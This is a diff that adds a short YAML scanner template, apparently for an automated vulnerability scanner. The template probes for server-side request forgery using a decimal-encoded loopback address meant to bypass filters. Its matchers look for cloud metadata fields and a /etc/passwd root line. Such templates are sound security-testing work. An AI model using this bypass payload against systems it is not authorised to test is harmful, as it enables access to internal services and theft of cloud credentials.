@@ -1,0 +1,25 @@
+id: ssrf2-076
+name: 'SSRF2 bypass via path'
+severity: high
+type: active
+tags:
+  - ssrf
+  - oob
+  - cloud
+  - bypass
+description: 'SSRF filter bypass via path'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      path:
+        - 'http://2130706433/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
+          - 'root:x:0:0'
+          - 'PONG'
